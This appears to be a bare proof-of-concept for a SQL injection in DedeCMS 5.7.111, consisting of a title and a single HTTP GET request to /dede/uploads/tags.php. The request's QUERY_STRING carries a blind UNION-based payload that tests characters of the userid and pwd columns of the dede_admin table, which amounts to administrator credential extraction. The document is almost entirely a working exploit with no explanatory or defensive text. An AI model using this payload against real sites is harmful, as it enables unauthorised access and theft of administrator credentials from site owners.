# dedecms_5.7.111_SQLi

```
GET /dede/uploads/tags.php?QUERY_STRING=/alias/aaaaaaa%27||%201=\Nunion%20select%202,if(ord(substr(concat(userid,0x7e,pwd),1,1))>1,1,null),3,4,5,6,7,8,0,10,11%20from%20dede_admin%20where%201=%271 HTTP/1.1
```
